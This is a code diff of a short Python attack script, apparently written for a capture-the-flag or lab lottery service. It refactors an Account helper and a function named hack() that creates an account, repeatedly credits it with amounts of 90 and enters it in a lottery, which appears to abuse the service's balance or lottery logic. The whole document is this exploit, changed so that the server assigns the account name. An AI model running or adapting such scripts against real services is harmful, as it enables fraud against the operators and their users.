@@ -8,22 +8,22 @@ class Account:
 
     name = None
 
-    def __init__(self, name):
-        self.create(name)
-        self.name = name
+    def __init__(self):
+        self.name = self.create()
 
-    def create(self, name):
-        resp = requests.post(URL + "/account", json={"name": name})
-        if resp.status_code != 201:
+    def create(self):
+        resp = requests.post(URL + "/account")
+        if resp.status_code != 200:
             raise Exception("couldn't create account: status code = " + str(resp.status_code))
-    
+        return resp.json()["name"]
+
     def add_amount(self, amount):
         requests.post(URL + "/account/" + self.name + "/amount", json={"amount": amount})
 
     def get(self):
         resp = requests.get(URL + "/account/" + self.name)
         return resp.json()
-    
+
     def lottery_add(self):
         requests.post(URL + "/lottery/add", json={"accountName": self.name})
 
@@ -32,8 +32,8 @@ class Account:
         return resp.json()
 
 
-def hack(user_name):
-    a = Account(user_name)
+def hack():
+    a = Account()
     a.add_amount(90)
     a.add_amount(90)
     a.add_amount(90)
@@ -46,4 +46,4 @@ def hack(user_name):
 
 
 if __name__ == "__main__":
-    hack("hacker")
+    hack()
